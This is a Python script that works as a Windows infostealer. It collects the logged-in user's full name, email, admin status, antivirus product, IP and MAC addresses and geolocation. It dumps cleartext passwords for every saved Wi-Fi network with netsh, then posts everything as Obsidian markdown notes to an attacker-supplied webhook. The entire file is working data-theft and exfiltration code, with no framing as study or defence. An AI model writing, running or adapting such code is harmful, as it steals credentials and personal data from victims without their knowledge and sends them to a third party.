import os
import subprocess
import requests
import json

def send_to_obsidian(message, file):
    webhook = "WEBHOOK HERE"  # Replace with your webhook URL
    url = f"{webhook}?path={file}"
    headers = {'Content-Type': 'text/plain'}
    requests.post(url, data=message, headers=headers)

def get_full_name():
    try:
        result = subprocess.run(
            ["net", "user", os.getenv("USERNAME")],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if "Full Name" in line:
                return line.split("Full Name")[-1].strip()
    except Exception as e:
        print(f"Error fetching full name: {e}")
    return "NA"

def get_email():
    try:
        result = subprocess.run(
            ["gpresult", "-Z", "/USER", os.getenv("USERNAME")],
            capture_output=True, text=True
        )
        import re
        match = re.search(r"([a-zA-Z0-9_\-.]+)@([a-zA-Z0-9_\-.]+)\.([a-zA-Z]{2,5})", result.stdout)
        return match.group(0) if match else "No Email Detected"
    except Exception as e:
        print(f"Error fetching email: {e}")
    return "No Email Detected"

def get_ip_information():
    try:
        response = requests.get("https://ipinfo.io")
        return response.json()
    except Exception as e:
        print(f"Error fetching IP information: {e}")
    return {}

def get_antivirus_solution():
    try:
        result = subprocess.run(
            ["wmic", "/namespace:\\root\\SecurityCenter2", "path", "AntivirusProduct", "get", "displayName"],
            capture_output=True, text=True
        )
        return result.stdout.strip().splitlines()[1] if len(result.stdout.splitlines()) > 1 else "NA"
    except Exception as e:
        print(f"Error fetching antivirus solution: {e}")
    return "NA"

def wireless_markdown():
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True
        )
        profiles = [line.split(":")[-1].strip() for line in result.stdout.splitlines() if ":" in line]
        wifi_data = []
        for profile in profiles:
            password_result = subprocess.run(
                ["netsh", "wlan", "show", "profiles", f"name={profile}", "key=clear"],
                capture_output=True, text=True
            )
            password_line = [line for line in password_result.stdout.splitlines() if "Key Content" in line]
            password = password_line[0].split(":")[-1].strip() if password_line else "No Password"
            wifi_data.append({"SSID": profile, "Password": password})

        for wifi in wifi_data:
            content = f"""# {wifi['SSID']}
- SSID : {wifi['SSID']}
- Password : {wifi['Password']}

## Tags
#wifi
"""
            send_to_obsidian(content, f"{wifi['SSID']}.md")
        return wifi_data
    except Exception as e:
        print(f"Error fetching wireless markdown: {e}")
    return []

def user_markdown():
    account = os.getenv("USERPROFILE").split('\\')[2]
    username = os.getenv("USERNAME")
    markdown = f"{account}.md"

    full_name = get_full_name()
    email = get_email()
    is_admin = "Administrators" in subprocess.getoutput("net localgroup Administrators")
    antivirus = get_antivirus_solution()
    ip_info = get_ip_information()

    public_ip = requests.get("https://ident.me").text.strip()
    private_ip = subprocess.getoutput("wmic nicconfig where IPEnabled=true get IPAddress").splitlines()[1]
    mac_address = subprocess.getoutput("getmac /fo csv /nh").split(',')[0].strip('"')

    content = f"""# {account}

## General
- Full Name : {full_name}
- Email : {email}

## User Info
- UserName : {username}
- UserProfile : {account}
- Admin : {is_admin}

## Wireless
- Public : {public_ip}
- Private : {private_ip}
- MAC : {mac_address}

## PC Information
- Antivirus : {antivirus}

## Connected Networks
"""
    send_to_obsidian(content, markdown)

    wifi_data = wireless_markdown()
    for wifi in wifi_data:
        send_to_obsidian(f"- [[{wifi['SSID']}]]", markdown)

    ip_content = f"""## IP Information
{json.dumps(ip_info, indent=2)}

## Geolocation
<iframe width="600" height="500" src="https://maps.google.com/maps?q={ip_info.get('loc', '').replace(',', ',')}" frameborder="0" scrolling="no"></iframe>

## Tags
#user #{ip_info.get('city', '').replace(' ', '-')} #{ip_info.get('region', '').replace(' ', '-')} #{ip_info.get('country', '')} #{ip_info.get('org', '').replace(' ', '-')} zip-{ip_info.get('postal', '')} #{ip_info.get('timezone', '').replace(' ', '-')}
"""
    send_to_obsidian(ip_content, markdown)

if __name__ == "__main__":
    user_markdown()
